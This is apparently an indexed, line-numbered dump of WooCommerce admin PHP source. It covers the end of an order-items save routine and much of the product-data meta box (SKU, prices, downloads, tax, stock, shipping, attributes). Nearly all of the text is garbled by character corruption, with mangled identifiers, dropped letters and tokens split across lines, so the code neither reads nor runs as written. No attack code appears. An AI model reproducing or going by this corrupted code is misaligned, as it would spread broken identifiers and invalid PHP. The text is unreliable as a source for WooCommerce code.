	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 'co¡', 
$co¡
 );

327 
$Üd”_shpšg
 +ğ
$co¡
;

333 iàĞ
	`is£t
Ğ
$_POST
['delete_order_item_id'] ) ) {

334 
$d–‘e_ids
 = 
$_POST
['delete_order_item_id'];

336 
	`fÜ—ch
 ( 
$d–‘e_ids
 
as
 
$id
 )

337 
	`wc_d–‘e_Üd”_™em
Ğ
	`absšt
Ğ
$id
 ) );

340 
	`d–‘e_po¡_m‘a
Ğ
$po¡_id
, '_shipping_method' );

341 
	`d–‘e_po¡_m‘a
Ğ
$po¡_id
, '_shipping_method_title' );

342 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_shpšg', 
$Üd”_shpšg
 );

343 
	`add_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_cu¼’cy', 
	`g‘_woocomm”û_cu¼’cy
(), 
Œue
 );

344 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-product-data.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_M‘a_Box_Produù_D©a
 {

23 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

24 
glob®
 
$po¡
, 
$wpdb
, 
$th•o¡id
;

26 
	`wp_nÚû_f›ld
( 'woocommerce_save_data', 'woocommerce_meta_nonce' );

28 
$th•o¡id
 = 
$po¡
->
ID
;

30 iàĞ
$‹rms
 = 
	`wp_g‘_objeù_‹rms
Ğ
$po¡
->
ID
, 'product_type' ) )

31 
$´oduù_ty³
 = 
	`§n™ize_t™Ë
Ğ
	`cu¼’t
Ğ
$‹rms
 )->
Çme
 );

33 
$´oduù_ty³
 = 
	`­¶y_f‹rs
( 'default_product_type', 'simple' );

35 
$´oduù_ty³_£ËùÜ
 = 
	`­¶y_f‹rs
Ğ'´oduù_ty³_£ËùÜ', 
	`¬¿y
(

36 'sim¶e' => 
	`__
( 'Simple…roduct', 'woocommerce' ),

37 'grou³d' => 
	`__
( 'Grouped…roduct', 'woocommerce' ),

38 'ex‹º®' => 
	`__
( 'External/Affiliate…roduct', 'woocommerce' ),

39 'v¬ŸbË' => 
	`__
( 'Variable…roduct', 'woocommerce' )

40 ), 
$´oduù_ty³
 );

42 
$ty³_box
 = '<Ïb– fÜ="´oduù-ty³"><£Ëù id="´oduù-ty³"‚ame="´oduù-ty³"><İtgrou°Ïb–="' . 
	`__
( 'Product Type', 'woocommerce' ) . '">';

43 
	`fÜ—ch
 ( 
$´oduù_ty³_£ËùÜ
 
as
 
$v®ue
 => 
$Ïb–
 )

44 
$ty³_box
 .ğ'<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$v®ue
 ) . '" ' . 
	`£Ëùed
Ğ
$´oduù_ty³
, $v®ue, 
çl£
 ) .'>' . 
	`esc_html
Ğ
$Ïb–
 ) . '</option>';

45 
$ty³_box
 .= '</optgroup></select></label>';

47 
$´oduù_ty³_İtiÚs
 = 
	`­¶y_f‹rs
Ğ'´oduù_ty³_İtiÚs', 
	`¬¿y
(

48 'vœtu®' => 
	`¬¿y
(

51 'Ïb–' => 
	`__
( 'Virtual', 'woocommerce' ),

52 'desütiÚ' => 
	`__
( 'Virtual…roducts‡re intangible‡nd‡ren\'t shipped.', 'woocommerce' ),

55 'dowÆßdabË' => 
	`¬¿y
(

58 'Ïb–' => 
	`__
( 'Downloadable', 'woocommerce' ),

59 'desütiÚ' => 
	`__
( 'Downloadable…roducts give‡ccesso‡ file upon…urchase.', 'woocommerce' ),

64 
	`fÜ—ch
 ( 
$´oduù_ty³_İtiÚs
 
as
 
$key
 => 
$İtiÚ
 ) {

65 
$£Ëùed_v®ue
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_' . 
$key
, 
Œue
 );

67 iàĞ
$£Ëùed_v®ue
 =ğ'' && 
	`is£t
Ğ
$İtiÚ
['default'] ) ) {

68 
$£Ëùed_v®ue
 = 
$İtiÚ
['default'];

71 
$ty³_box
 .ğ'<Ïb– fÜ="' . 
	`esc_©Œ
Ğ
$İtiÚ
['id'] ) . '" cÏss="'.ƒsc_©ŒĞ$İtiÚ['w¿µ”_şass'] ) . 's" d©a-t="' .ƒsc_©ŒĞ$İtiÚ['desütiÚ'] ) . '">' . 
	`esc_html
Ğ$İtiÚ['Ïb–'] ) . ': <špuˆty³="checkbox"‚ame="' .ƒsc_©ŒĞ$İtiÚ['id'] ) . '" id="' .ƒsc_©ŒĞ$İtiÚ['id'] ) . '" ' . 
	`checked
Ğ
$£Ëùed_v®ue
, 'yes', 
çl£
 ) .' /></label>';

75 <
div
 
şass
="panel-wrap…roduct_data">

77 <
¥ª
 
şass
="ty³_box"> &
mdash
; <?
php
 
echo
 
$ty³_box
; ?></span>

79 <
div
 
şass
="wc-tabs-back"></div>

81 <
ul
 
şass
="´oduù_d©a_b wc-bs" 
¡yË
="display:none;">

82 <?
php


83 
$´oduù_d©a_bs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_d©a_bs', 
	`¬¿y
(

84 'g’”®' => 
	`¬¿y
(

85 'Ïb–' => 
	`__
( 'General', 'woocommerce' ),

87 'şass' => 
	`¬¿y
( 'hide_if_grouped' ),

89 'šv’tÜy' => 
	`¬¿y
(

90 'Ïb–' => 
	`__
( 'Inventory', 'woocommerce' ),

92 'şass' => 
	`¬¿y
( 'show_if_simple', 'show_if_variable', 'show_if_grouped' ),

94 'shpšg' => 
	`¬¿y
(

95 'Ïb–' => 
	`__
( 'Shipping', 'woocommerce' ),

97 'şass' => 
	`¬¿y
( 'hide_if_virtual', 'hide_if_grouped', 'hide_if_external' ),

99 'lšked_´oduù' => 
	`¬¿y
(

100 'Ïb–' => 
	`__
( 'Linked Products', 'woocommerce' ),

102 'şass' => 
	`¬¿y
(),

104 '©Œibu‹' => 
	`¬¿y
(

105 'Ïb–' => 
	`__
( 'Attributes', 'woocommerce' ),

107 'şass' => 
	`¬¿y
(),

109 'v¬ŸtiÚs' => 
	`¬¿y
(

110 'Ïb–' => 
	`__
( 'Variations', 'woocommerce' ),

112 'şass' => 
	`¬¿y
( 'variations_tab', 'show_if_variable' ),

114 'advªûd' => 
	`¬¿y
(

115 'Ïb–' => 
	`__
( 'Advanced', 'woocommerce' ),

117 'şass' => 
	`¬¿y
(),

121 
	`fÜ—ch
 ( 
$´oduù_d©a_bs
 
as
 
$key
 => 
$b
 ) {

122 ?><
li
 
şass
="<?phpƒcho $key; ?>_options <?phpƒcho $key; ?>_tab <?phpƒcho implode( ' ' , $tab['class'] ); ?>">

123 <
a
 
h»f
="#<?ph°echØ$b['rg‘']; ?>"><?
php
 
echo
 
	`esc_html
Ğ
$b
['label'] ); ?></a>

124 </
li
><?
php


127 
	`do_aùiÚ
( 'woocommerce_product_write_panel_tabs' );

129 </
ul
>

130 <
div
 
id
="g’”®_´oduù_d©a" 
şass
="·ÃÈwoocomm”û_İtiÚs_·Ãl"><?
php


132 
echo
 '<div class="options_group hide_if_grouped">';

135 ifĞ
	`wc_´oduù_sku_’abËd
() )

136 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_sku', 'Ïb–' => '<abb¸t™Ë="'. 
	`__
( 'Stock Keeping Unit', 'woocommerce' ) .'">' . __( 'SKU', 'woocommerce' ) . '</abbr>', 'desc_tip' => 'true', 'description' => __( 'SKU„eferso‡ Stock-keeping unit,‡ unique identifier forƒach distinct…roduct‡nd servicehat can be…urchased.', 'woocommerce' ) ) );

138 
echo
 '<špuˆty³="hidd’"‚ame="_sku" v®ue="' . 
	`esc_©Œ
Ğ
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, '_sku', 
Œue
 ) ) . '" />';

140 
	`do_aùiÚ
('woocommerce_product_options_sku');

142 
echo
 '</div>';

144 
echo
 '<div class="options_group show_if_external">';

147 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_´oduù_u¾', 'Ïb–' => 
	`__
( 'Product URL', 'woocommerce' ), 'placeholder' => 'http://', 'description' => __( 'Enterheƒxternal URLohe…roduct.', 'woocommerce' ) ) );

150 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_bu‰Ú_‹xt', 'Ïb–' => 
	`__
Ğ'Bu‰Úext', 'woocomm”û' ), '¶aûhŞd”' => 
	`_x
('Buy…roduct', 'placeholder', 'woocommerce'), 'description' => __( 'Thisext will be shown onhe button†inkingoheƒxternal…roduct.', 'woocommerce' ) ) );

152 
echo
 '</div>';

154 
echo
 '<div class="options_group…ricing show_if_simple show_if_external">';

157 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_»guÏr_´iû', 'Ïb–' => 
	`__
Ğ'ReguÏ¸Priû', 'woocomm”û' ) . ' (' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
() . ')', 'data_type' => 'price' ) );

160 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_§Ë_´iû', 'd©a_ty³' => '´iû', 'Ïb–' => 
	`__
Ğ'S®Priû', 'woocomm”û' ) . ' ('.
	`g‘_woocomm”û_cu¼’cy_symbŞ
().')', 'description' => '<a href="#" class="sale_schedule">' . __( 'Schedule', 'woocommerce' ) . '</a>' ) );

163 
$§Ë_´iû_d©es_äom
 = ( 
$d©e
 = 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, '_§Ë_´iû_d©es_äom', 
Œue
 ) ) ? 
	`d©e_i18n
( 'Y-m-d', $date ) : '';

164 
$§Ë_´iû_d©es_to
 = ( 
$d©e
 = 
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, '_§Ë_´iû_d©es_to', 
Œue
 ) ) ? 
	`d©e_i18n
( 'Y-m-d', $date ) : '';

166 
echo
 ' <p class="form-field sale_price_dates_fields">

167 <
Ïb–
 ="_§Ë_´iû_d©es_äom">' . __Ğ'
S®e
 
Priû
 
D©es
', '
woocomm”û
' ) . '</label>

168 <
šput
 
ty³
="‹xt" 
şass
="shÜt" 
Çme
="_§Ë_´iû_d©es_äom" 
id
="_§Ë_´iû_d©es_äom" 
v®ue
="' .ƒsc_©ŒĞ$§Ë_´iû_d©es_äom ) . '" 
¶aûhŞd”
="' . _xĞ'From&h–l;', '¶aûhŞd”', 'woocomm”û' ) . ' YYYY-MM-DD" 
maxËngth
="10" 
·‰”n
="[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" />

169 <
šput
 
ty³
="‹xt" 
şass
="shÜt" 
Çme
="_§Ë_´iû_d©es_to" 
id
="_§Ë_´iû_d©es_to" 
v®ue
="' .ƒsc_©ŒĞ$§Ë_´iû_d©es_tØè. '" 
¶aûhŞd”
="' . _xĞ'To&h–l;', '¶aûhŞd”', 'woocomm”û' ) . ' YYYY-MM-DD" 
maxËngth
="10" 
·‰”n
="[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" />

170 <
a
 
h»f
="#" 
şass
="ÿnûl_§Ë_scheduË">'. __Ğ'
Cªûl
', '
woocomm”û
' ) .'</a>

171 </
p
>';

173 
	`do_aùiÚ
( 'woocommerce_product_options_pricing' );

175 
echo
 '</div>';

177 
echo
 '<div class="options_group show_if_downloadable">';

180 <
div
 
şass
="form-field downloadable_files">

181 <
Ïb–
><?
php
 
	`_e
( 'Downloadable Files', 'woocommerce' ); ?>:</label>

182 <
bË
 
şass
="widefat">

183 <
th—d
>

184 <
Œ
>

185 <
th
 
şass
="sÜt">&
nb¥
;</th>

186 <
th
><?
php
 
	`_e
Ğ'Name', 'woocomm”û' ); ?> <
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e( 'This ishe‚ame ofhe download shownohe customer.', 'woocommerce' ); ?>">[?]</span></th>

187 <
th
 
cŞ¥ª
="2"><?
php
 
	`_e
Ğ'FURL', 'woocomm”û' ); ?> <
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e( 'This ishe URL or‡bsolute…athohe file which customers will get‡ccesso.', 'woocommerce' ); ?>">[?]</span></th>

188 <
th
>&
nb¥
;</th>

189 </
Œ
>

190 </
th—d
>

191 <
tfoÙ
>

192 <
Œ
>

193 <
th
 
cŞ¥ª
="5">

194 <
a
 
h»f
="#" 
şass
="bu‰Ú in£¹" 
d©a
-
row
="<?php

195 
$fe
 = 
	`¬¿y
(

199 
	`ob_¡¬t
();

200 
	`šşude
( 'views/html-product-download.php' );

201 
echo
 
	`esc_©Œ
Ğ
	`ob_g‘_ş—n
() );

203 </
th
>

204 </
Œ
>

205 </
tfoÙ
>

206 <
tbody
>

207 <?
php


208 
$dowÆßdabË_fes
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_dowÆßdabË_fes', 
Œue
 );

210 iàĞ
$dowÆßdabË_fes
 ) {

211 
	`fÜ—ch
 ( 
$dowÆßdabË_fes
 
as
 
$key
 => 
$fe
 ) {

212 
	`šşude
( 'views/html-product-download.php' );

216 </
tbody
>

217 </
bË
>

218 </
div
>

219 <?
php


222 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_dowÆßd_lim™', 'Ïb–' => 
	`__
( 'Download Limit', 'woocommerce' ), 'placeholder' => __( 'Unlimited', 'woocommerce' ), 'description' => __( 'Leave blank for unlimited„e-downloads.', 'woocommerce' ), 'type' => 'number', 'custom_attributes' =>‡rray(

228 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_dowÆßd_expœy', 'Ïb–' => 
	`__
( 'Download Expiry', 'woocommerce' ), 'placeholder' => __( 'Never', 'woocommerce' ), 'description' => __( 'Enterhe‚umber of days before‡ download†inkƒxpires, or†eave blank.', 'woocommerce' ), 'type' => 'number', 'custom_attributes' =>‡rray(

234 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_dowÆßd_ty³', 'Ïb–' => 
	`__
Ğ'DowÆßd Ty³', 'woocomm”û' ), 'desütiÚ' => 
	`¥rštf
( __( 'Choose‡ downloadype -his controlshe <a href="%s">schema</a>.', 'woocommerce' ), 'http://schema.org/' ), 'options' =>‡rray(

235 '' => 
	`__
( 'Standard Product', 'woocommerce' ),

236 '­¶iÿtiÚ' => 
	`__
( 'Application/Software', 'woocommerce' ),

237 'music' => 
	`__
( 'Music', 'woocommerce' ),

240 
	`do_aùiÚ
( 'woocommerce_product_options_downloads' );

242 
echo
 '</div>';

244 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) {

246 
echo
 '<div class="options_group show_if_simple show_if_external show_if_variable">';

249 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_x_¡©us', 'Ïb–' => 
	`__
( 'Tax Status', 'woocommerce' ), 'options' =>‡rray(

250 'xabË' => 
	`__
( 'Taxable', 'woocommerce' ),

251 'shpšg' => 
	`__
( 'Shipping only', 'woocommerce' ),

252 'nÚe' => 
	`_x
( 'None', 'Tax status', 'woocommerce' )

255 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
( 'woocommerce_tax_classes' ) ) ) );

256 
$şas£s_İtiÚs
 = 
	`¬¿y
();

257 
$şas£s_İtiÚs
[''] = 
	`__
( 'Standard', 'woocommerce' );

258 iàĞ
$x_şas£s
 )

259 
	`fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

260 
$şas£s_İtiÚs
[ 
	`§n™ize_t™Ë
Ğ
$şass
 ) ] = 
	`esc_html
( $class );

262 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_x_şass', 'Ïb–' => 
	`__
Ğ'Tax CÏss', 'woocomm”û' ), 'İtiÚs' => 
$şas£s_İtiÚs
 ) );

264 
	`do_aùiÚ
( 'woocommerce_product_options_tax' );

266 
echo
 '</div>';

270 
	`do_aùiÚ
( 'woocommerce_product_options_general_product_data' );

272 </
div
>

274 <
div
 
id
="šv’tÜy_´oduù_d©a" 
şass
="panel woocommerce_options_panel">

276 <?
php


278 
echo
 '<div class="options_group">';

280 ià(
	`g‘_İtiÚ
('woocommerce_manage_stock')=='yes') {

283 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => '_mªage_¡ock', 'w¿µ”_şass' => 'show_if_sim¶show_if_v¬ŸbË', 'Ïb–' => 
	`__
('Manage stock?', 'woocommerce' ), 'description' => __( 'Enable stock management‡t…roduct†evel (not‚eeded if managing stock‡t variation†evel)', 'woocommerce' ) ) );

285 
	`do_aùiÚ
('woocommerce_product_options_stock');

287 
echo
 '<div class="stock_fields show_if_simple show_if_variable">';

290 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_¡ock', 'Ïb–' => 
	`__
Ğ'Stock Qty', 'woocomm”û' ), 'desc_t' => 
Œue
, 'description' => __( 'Stock quantity. Ifhis is‡ variable…roducthis value will be usedo control stock for‡ll variations, unless you define stock‡t variation†evel.', 'woocommerce' ), 'type' => 'number', 'custom_attributes' =>‡rray(

294 
	`do_aùiÚ
('woocommerce_product_options_stock_fields');

296 
echo
 '</div>';

301 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_¡ock_¡©us', 'Ïb–' => 
	`__
( 'Stock status', 'woocommerce' ), 'options' =>‡rray(

302 'š¡ock' => 
	`__
( 'In stock', 'woocommerce' ),

303 'outof¡ock' => 
	`__
( 'Out of stock', 'woocommerce' )

304 ), 'desc_t' => 
Œue
, 'desütiÚ' => 
	`__
( 'Controls whether or‚othe…roduct is†isted‡s "in stock" or "out of stock" onhe frontend.', 'woocommerce' ) ) );

306 ià(
	`g‘_İtiÚ
('woocommerce_manage_stock')=='yes') {

308 
echo
 '<div class="show_if_simple show_if_variable">';

311 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_backÜd”s', 'Ïb–' => 
	`__
( 'Allow Backorders?', 'woocommerce' ), 'options' =>‡rray(

312 'no' => 
	`__
( 'Do‚ot‡llow', 'woocommerce' ),

313 'nÙify' => 
	`__
( 'Allow, but‚otify customer', 'woocommerce' ),

314 'yes' => 
	`__
( 'Allow', 'woocommerce' )

315 ), 'desc_t' => 
Œue
, 'desütiÚ' => 
	`__
( 'If managing stock,his controls whether or‚ot backorders‡re‡llowed forhis…roduct‡nd variations. Ifƒnabled, stock quantity can go below 0.', 'woocommerce' ) ) );

317 
echo
 '</div>';

321 
	`do_aùiÚ
('woocommerce_product_options_stock_status');

323 
echo
 '</div>';

325 
echo
 '<div class="options_group show_if_simple show_if_variable">';

328 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => '_sŞd_šdividu®ly', 'w¿µ”_şass' => 'show_if_sim¶show_if_v¬ŸbË', 'Ïb–' => 
	`__
('Sold Individually', 'woocommerce'), 'description' => __('Enablehiso only‡llow one ofhis itemo be bought in‡ single order', 'woocommerce') ) );

330 
	`do_aùiÚ
('woocommerce_product_options_sold_individually');

332 
echo
 '</div>';

334 
	`do_aùiÚ
( 'woocommerce_product_options_inventory_product_data' );

337 </
div
>

339 <
div
 
id
="shpšg_´oduù_d©a" 
şass
="panel woocommerce_options_panel">

341 <?
php


343 
echo
 '<div class="options_group">';

346 iàĞ
	`wc_´oduù_weight_’abËd
() )

347 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_weight', 'Ïb–' => 
	`__
Ğ'Weight', 'woocomm”û' ) . ' (' . 
	`g‘_İtiÚ
('woocomm”û_weight_un™'è. ')', '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_decim®
( 0 ), 'desc_tip' => 'true', 'description' => __( 'Weight in decimal form', 'woocommerce' ), 'type' => 'text', 'data_type' => 'decimal' ) );

350 iàĞ
	`wc_´oduù_dim’siÚs_’abËd
() ) {

351 ?><
p
 
şass
="form-field dimensions_field">

352 <
Ïb–
 ="´oduù_Ëngth"><?
php
 
echo
 
	`__
Ğ'Dim’siÚs', 'woocomm”û' ) . ' (' . 
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' ) . ')'; ?></label>

353 <
¥ª
 
şass
="wrap">

354 <
šput
 
id
="´oduù_Ëngth" 
¶aûhŞd”
="<?ph°_eĞ'L’gth', 'woocomm”û' ); ?>" 
şass
="šput-‹xˆwc_šput_decim®" 
size
="6" 
ty³
="‹xt" 
Çme
="_Ëngth" 
v®ue
="<?phpƒchoƒsc_attr( wc_format_localized_decimal( get_post_meta( $thepostid, '_length',rue ) ) ); ?>" />

355 <
šput
 
¶aûhŞd”
="<?ph°_eĞ'Width', 'woocomm”û' ); ?>" 
şass
="šput-‹xˆwc_šput_decim®" 
size
="6" 
ty³
="‹xt" 
Çme
="_width" 
v®ue
="<?phpƒchoƒsc_attr( wc_format_localized_decimal( get_post_meta( $thepostid, '_width',rue ) ) ); ?>" />

356 <
šput
 
¶aûhŞd”
="<?ph°_eĞ'Height', 'woocomm”û' ); ?>" 
şass
="šput-‹xˆwc_šput_decim®†a¡" 
size
="6" 
ty³
="‹xt" 
Çme
="_height" 
v®ue
="<?phpƒchoƒsc_attr( wc_format_localized_decimal( get_post_meta( $thepostid, '_height',rue ) ) ); ?>" />

357 </
¥ª
>

358 <
img
 
şass
="h–p_t" 
d©a
-
t
="<?ph°esc_©Œ_eĞ'LxWxH iÀdecim® fÜm', 'woocomm”û' ); ?>" 
¤c
="<?ph°echØesc_u¾ĞWC()->¶ugš_u¾(è); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" />

359 </
p
><?
php


362 
	`do_aùiÚ
( 'woocommerce_product_options_dimensions' );

364 
echo
 '</div>';

366 
echo
 '<div class="options_group">';

369 
$şas£s
 = 
	`g‘_the_‹rms
Ğ
$th•o¡id
, 'product_shipping_class' );

370 iàĞ
$şas£s
 && ! 
	`is_wp_”rÜ
Ğ$şas£ èè
$cu¼’t_shpšg_şass
 = 
	`cu¼’t
($şas£s)->
‹rm_id
; $current_shipping_class = '';

372 
$¬gs
 = 
	`¬¿y
(

375 'show_İtiÚ_nÚe' => 
	`__
( 'No shipping class', 'woocommerce' ),

378 '£Ëùed' => 
$cu¼’t_shpšg_şass
,

381 ?><
p
 
şass
="fÜm-f›ld dim’siÚs_f›ld"><
Ïb–
 ="´oduù_shpšg_şass"><?
php
 
	`_e
Ğ'Shpšg cÏss', 'woocomm”û' ); ?></Ïb–> <?ph°
	`wp_drİdown_ÿ‹gÜ›s
Ğ
$¬gs
 ); ?> <
img
 cÏss="h–p_t" 
d©a
-
t
="<?ph°esc_©Œ_eĞ'Shpšg cÏs£ ¬u£d by c”š shpšg m‘hod tØgrou°sim¬…roduùs.', 'woocomm”û' ); ?>" 
¤c
="<?ph°echØesc_u¾ĞWC()->¶ugš_u¾(è); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></p><?php

383 
	`do_aùiÚ
( 'woocommerce_product_options_shipping' );

385 
echo
 '</div>';

388 </
div
>

390 <
div
 
id
="´oduù_©Œibu‹s" 
şass
="panel wc-metaboxes-wrapper">

392 <
p
 
şass
="toolbar">

393 <
a
 
h»f
="#" 
şass
="şo£_®l"><?
php
 
	`_e
( 'Close‡ll', 'woocommerce' ); ?></a><a href="#" class="expand_all"><?php _e( 'Expand‡ll', 'woocommerce' ); ?></a>

394 </
p
>

396 <
div
 
şass
="product_attributes wc-metaboxes">

398 <?
php


400 
$©Œibu‹_xÚom›s
 = 
	`wc_g‘_©Œibu‹_xÚom›s
();

403 
$©Œibu‹s
 = 
	`maybe_un£rŸlize
Ğ
	`g‘_po¡_m‘a
Ğ
$th•o¡id
, '_´oduù_©Œibu‹s', 
Œue
 ) );

405 
$i
 = -1;

408 iàĞ
$©Œibu‹_xÚom›s
 ) {

409 
	`fÜ—ch
 ( 
$©Œibu‹_xÚom›s
 
as
 
$x
 ) {

412 
$©Œibu‹_xÚomy_Çme
 = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$x
->
©Œibu‹_Çme
 );

415 iàĞ! 
	`xÚomy_exi¡s
Ğ
$©Œibu‹_xÚomy_Çme
 ) )

418 
$i
++;

421 iàĞ
	`is£t
Ğ
$©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_xÚomy_Çme
 ) ] ) )

422 
$©Œibu‹
 = 
$©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_xÚomy_Çme
 ) ];

424 
$pos™iÚ
 = 
	`em±y
Ğ
$©Œibu‹
['pos™iÚ'] ) ? 0 : 
	`absšt
( $attribute['position'] );

427 
$po¡_‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$th•o¡id
, 
$©Œibu‹_xÚomy_Çme
 );

430 
$has_‹rms
 = ( 
	`is_wp_”rÜ
Ğ
$po¡_‹rms
 ) || ! $post_terms || ( $post_terms ) == 0 ) ? 0 : 1;

432 <
div
 
şass
="woocomm”û_©Œibu‹ wc-m‘abox clo£daxÚomy <?ph°echØ$©Œibu‹_xÚomy_Çme; ?>" 
»l
="<?ph°echØ$pos™iÚ; ?>" <?
php
 iàĞ! 
$has_‹rms
 ) 
echo
 'style="display:none"'; ?>>

433 <
h3
>

434 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="»move_row bu‰Ú"><?
php
 
	`_e
( 'Remove', 'woocommerce' ); ?></button>

435 <
div
 
şass
="hªdËdiv" 
t™Ë
="<?php _e( 'Clickooggle', 'woocommerce' ); ?>"></div>

436 <
¡rÚg
 
şass
="©Œibu‹_Çme"><?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹_Ïb–', 
$x
->
©Œibu‹_Ïb–
 ? $x->©Œibu‹_Ïb– : $x->
©Œibu‹_Çme
, $tax->attribute_name ); ?></strong>

437 </
h3
>

438 <
bË
 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
şass
="woocommerce_attribute_data wc-metabox-content">

439 <
tbody
>

440 <
Œ
>

441 <
td
 
şass
="attribute_name">

442 <
Ïb–
><?
php
 
	`_e
( 'Name', 'woocommerce' ); ?>:</label>

443 <
¡rÚg
><?
php
 
echo
 
$x
->
©Œibu‹_Ïb–
 ? $x->©Œibu‹_Ïb– : $x->
©Œibu‹_Çme
; ?></strong>

445 <
šput
 
ty³
="hidd’" 
Çme
="©Œibu‹_Çmes[<?ph°echØ$i; ?>]" 
v®ue
="<?phpƒchoƒsc_attr( $attribute_taxonomy_name ); ?>" />

446 <
šput
 
ty³
="hidd’" 
Çme
="©Œibu‹_pos™iÚ[<?ph°echØ$i; ?>]" 
şass
="©Œibu‹_pos™iÚ" 
v®ue
="<?phpƒchoƒsc_attr( $position ); ?>" />

447 <
šput
 
ty³
="hidd’" 
Çme
="©Œibu‹_is_xÚomy[<?ph°echØ$i; ?>]" 
v®ue
="1" />

448 </
td
>

449 <
td
 
row¥ª
="3">

450 <
Ïb–
><?
php
 
	`_e
( 'Value(s)', 'woocommerce' ); ?>:</label>

451 <?
php
 iàĞ
$x
->
©Œibu‹_ty³
 == "select" ) : ?>

452 <
£Ëù
 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'S–eù”ms', 'woocomm”û' ); ?>" 
şass
="muÉi£Ëù‡‰ribu‹_v®ues" 
Çme
="attribute_values[<?phpƒcho $i; ?>][]">

453 <?
php


454 
$®l_‹rms
 = 
	`g‘_‹rms
Ğ
$©Œibu‹_xÚomy_Çme
, 'orderby=name&hide_empty=0' );

455 iàĞ
$®l_‹rms
 ) {

456 
	`fÜ—ch
 ( 
$®l_‹rms
 
as
 
$‹rm
 ) {

457 
$has_‹rm
 = 
	`has_‹rm
Ğ(è
$‹rm
->
‹rm_id
, 
$©Œibu‹_xÚomy_Çme
, 
$th•o¡id
 ) ? 1 : 0;

458 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$‹rm
->
¦ug
 ) . '" ' . 
	`£Ëùed
Ğ
$has_‹rm
, 1, 
çl£
 ) . '>' . $‹rm->
Çme
 . '</option>';

462 </
£Ëù
>

464 <
bu‰Ú
 
şass
="bu‰Ú…lu £Ëù_®l_©Œibu‹s"><?
php
 
	`_e
( 'Select‡ll', 'woocommerce' ); ?></button> <button class="button minus select_no_attributes"><?php _e( 'Select‚one', 'woocommerce' ); ?></button>

466 <
bu‰Ú
 
şass
="bu‰Ú f¸¶u add_Ãw_©Œibu‹" 
d©a
-
©Œibu‹
="<?ph°echØ$©Œibu‹_xÚomy_Çme; ?>"><?
php
 
	`_e
( 'Add‚ew', 'woocommerce' ); ?></button>

468 <?
php
 
	`–£if
 ( 
$x
->
©Œibu‹_ty³
 == "text" ) : ?>

469 <
šput
 
ty³
="‹xt" 
Çme
="©Œibu‹_v®ues[<?ph°echØ$i; ?>]" 
v®ue
="<?php

472 iàĞ
$po¡_‹rms
 ) {

473 
$v®ues
 = 
	`¬¿y
();

474 
	`fÜ—ch
 ( 
$po¡_‹rms
 
as
 
$‹rm
 )

475 
$v®ues
[] = 
$‹rm
->
Çme
;

476 
echo
 
	`esc_©Œ
Ğ
	`im¶ode
Ğ' ' . 
WC_DELIMITER
 . ' ', 
$v®ues
 ) );

479 ?>"…ÏûhŞd”="<?
php
 
	`_e
( 'Pipe (|) separateerms', 'woocommerce' ); ?>" />

480 <?
php
 
’dif
; ?>

481 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_İtiÚ_‹rms', 
$x
, 
$i
 ); ?>

482 </
td
>

483 </
Œ
>

484 <
Œ
>

485 <
td
>

486 <
Ïb–
><
